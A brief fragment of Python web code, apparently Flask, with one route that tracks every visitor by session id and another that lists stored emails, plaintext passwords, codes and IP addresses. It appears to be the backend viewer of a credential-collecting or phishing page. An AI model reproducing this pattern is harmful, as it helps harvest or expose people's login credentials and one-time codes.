...
def home():
    # Track every visitor
    try:
        sid = request.args.get('sid', 'visit_' + str(__import__('time').time()))
...
def view():
    try:
        con = get_db()
        cur = con.cursor()
        cur.execute("SELECT id,email,password,code,ip,visited_at,updated_at FROM sessions ORDER BY id DESC")
        rows = cur.fetchall()
        cur.close()
        con.close()
